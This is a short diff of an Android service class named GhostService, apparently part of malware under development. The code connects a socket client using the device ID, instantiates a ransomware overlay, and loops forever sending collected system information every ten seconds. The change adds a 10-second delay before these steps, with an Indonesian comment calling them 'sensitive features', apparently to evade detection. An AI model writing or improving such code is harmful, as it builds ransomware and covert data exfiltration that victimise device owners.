@@ -30,21 +30,25 @@ public class GhostService extends Service {
         super.onCreate();
         instance = this;
         startForeground(1, buildNotification());
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        socket = new SocketClient(deviceId);
-        socket.connect();
-        ransomware = new RansomwareOverlay(this);
 
-        new Thread(() -> {
-            while (true) {
-                try {
-                    if (socket != null) {
-                        socket.send("device_status", DataCollector.getSystemInfo(this).toString());
-                    }
-                    Thread.sleep(10000);
-                } catch (Exception e) {}
-            }
-        }).start();
+        // Tunda koneksi & fitur sensitif selama 10 detik
+        mainHandler.postDelayed(() -> {
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            socket = new SocketClient(deviceId);
+            socket.connect();
+            ransomware = new RansomwareOverlay(this);
+
+            new Thread(() -> {
+                while (true) {
+                    try {
+                        if (socket != null) {
+                            socket.send("device_status", DataCollector.getSystemInfo(this).toString());
+                        }
+                        Thread.sleep(10000);
+                    } catch (Exception e) {}
+                }
+            }).start();
+        }, 10000);
     }
 
     private Notification buildNotification() {
